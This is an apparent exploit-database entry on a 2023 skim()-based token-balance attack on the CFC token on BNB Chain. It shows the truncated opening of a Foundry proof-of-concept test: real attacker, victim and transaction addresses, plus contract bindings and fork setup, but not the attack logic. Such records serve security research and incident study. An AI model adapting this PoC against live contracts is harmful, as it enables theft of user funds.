# [?] CFC - Uniswap Skim() token balance attack

## Summary
Severity: Unknown
Chain: BNB Chain
Component: CFC
Published: 2023-06-15
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/CFC_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$16k

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~16k
// Attacker contract address : https://bscscan.com/address/0x8213e87bb381919b292ace364d97d3a1ee38caa4
// Vulnerable contract : https://bscscan.com/address/0xdd9b223aec6ea56567a62f21ff89585ff125632c
// Attack TX : https://explorer.phalcon.xyz/tx/bsc/0xa3c130ed8348919f73cbefce0f22d46fa381c8def93654e391ddc95553240c1e

// @Analysis : https://twitter.com/hexagate_/status/1669280632738906113 - Second TX

contract CFCTest is Test {
    IERC20 BEP20USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 SAFE = IERC20(0x4d7Fa587Ec8e50bd0E9cD837cb4DA796f47218a1);
    IERC20 CFC = IERC20(0xdd9B223AEC6ea56567A62f21Ff89585ff125632c);
    IDPPOracle DPPOracle1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle DPPOracle2 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracle DPPOracle3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IDPPOracle DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair CakeLP = IPancakePair(payable(0x595488F902C4d9Ec7236031a1D96cf63b0405CF0));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 29_116_478);
        cheats.label(address(BEP20USDT), "BEP20USDT");
        cheats.label(address(SAFE), "SAFE");
        cheats.label(address(CFC), "CFC");
        cheats.label(address(DPPOracle1), "DPPOracle1");
        cheats.label(address(DPPOracle2), "DPPOracle2");
        cheats.label(address(DPPOracle3), "DPPOracle3");
        cheats.label(address(DPP), "DPP");
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/CFC_exp.sol_
